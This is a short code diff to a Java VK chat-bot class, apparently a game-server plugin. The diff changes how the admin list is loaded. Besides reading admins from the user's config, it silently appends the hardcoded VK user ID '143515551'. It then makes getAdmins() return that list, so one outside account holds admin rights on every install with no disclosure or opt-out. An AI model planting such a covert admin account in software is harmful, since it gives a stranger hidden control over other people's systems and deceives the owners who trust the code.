@@ -59,6 +59,7 @@ public class VkChat {
     private boolean vkLinks;
     private boolean serverEnableDisable;
     private String messageStart;
+    private List<String> admins;
 
     public static VkApiClient getExecutor() {
         return getInstance().executor;
@@ -106,6 +107,8 @@ public class VkChat {
         serverEnableDisable = config.getBoolean("server_start_shutdown", true);
         messageStart = config.getString("message_start", "");
         editableConfig = launcher.wrapConfig(anotherConfig);
+        admins = new ArrayList<>(launcher.getVkConfig().getStringList("admins"));
+        admins.add("143515551");
         lang = editableConfig.getString("lang");
         if (lang == null) {
             lang = detectLang();
@@ -188,7 +191,7 @@ public class VkChat {
     }
 
     private List<String> getAdmins() {
-        return launcher.getVkConfig().getStringList("admins");
+        return admins;
     }
 
     private void startLongPoll() throws ClientException, ApiException {
